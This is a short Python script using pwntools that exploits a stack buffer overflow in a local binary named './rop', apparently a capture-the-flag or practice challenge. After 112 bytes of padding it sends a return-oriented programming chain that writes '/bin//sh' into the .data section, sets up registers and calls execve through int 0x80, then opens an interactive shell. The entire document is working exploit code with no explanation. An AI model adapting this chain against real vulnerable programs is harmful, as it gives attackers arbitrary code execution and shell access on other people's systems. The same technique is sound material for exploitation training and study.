from pwn import *
from struct import pack
io = process('./rop')
padding = b'A'*112
# Padding goes here
p = b''

p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bb196) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bb196) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054590) # xor eax, eax ; ret
p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0806eb91) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8

p += pack('<I', 0x080ea060) # padding without overwrite ebx

p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054590) # xor eax, eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x08049421) # int 0x80

payload = padding+p
io.sendlineafter(b'What do you plan to do?\n',payload)
io.interactive()
